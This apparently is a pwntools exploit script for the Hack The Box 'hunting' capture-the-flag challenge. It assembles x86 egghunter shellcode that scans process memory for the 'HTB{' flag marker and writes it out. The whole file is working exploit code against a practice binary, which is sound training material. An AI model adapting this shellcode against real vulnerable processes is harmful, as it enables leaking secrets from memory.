#!/usr/bin/python3
from pwn import *

shell = process("./hunting")
#shell = gdb.debug("./hunting", "b *0x5655654a\ncontinue")

egghunter  = b""
egghunter += asm("""
push 0x1b           # alarm()
pop eax             # $eax = alarm()
int 0x80            # syscall

mov edi, 0x7b425448 # HTB{
cdq                 # $edx = 0x0

.page:
    or dx, 0xfff

.find:
    inc edx
    pusha
    xor ecx, ecx
    lea ebx, [edx + 0x4]
    mov al, 0x21
    int 0x80

    cmp al, 0xf2
    popa
    jz .page
    cmp [edx], edi
    jnz .find

    mov ecx, edx
    push 0x24
    pop edx
    push 0x1
    pop ebx
    mov al, 0x4
    int 0x80
""")

print(len(egghunter))

shell.sendline(egghunter)
shell.interactive()
